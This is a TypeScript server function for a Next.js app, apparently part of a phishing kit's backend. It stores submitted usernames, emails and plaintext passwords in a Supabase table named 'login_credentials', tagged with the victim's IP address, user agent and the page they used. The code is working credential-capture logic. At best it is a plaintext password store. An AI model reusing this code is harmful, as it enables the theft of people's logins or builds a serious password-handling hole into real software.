import { NextRequest } from "next/server";
import { getSupabaseAdmin } from "./supabase";

export async function saveLoginCredential(
  request: NextRequest,
  username: string,
  password: string,
  page: string,
  email?: string,
) {
  const ip =
    request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    request.headers.get("x-real-ip") ||
    "unknown";
  const userAgent = request.headers.get("user-agent") || "unknown";
  const isEmail = username.includes("@");

  const supabase = getSupabaseAdmin();
  const { error } = await supabase.from("login_credentials").insert({
    email: email ?? (isEmail ? username : null),
    username: email ? username : isEmail ? null : username,
    password,
    ip_address: ip,
    user_agent: userAgent,
    page,
  });

  if (error) {
    console.error("Supabase insert error:", error);
    throw error;
  }
}
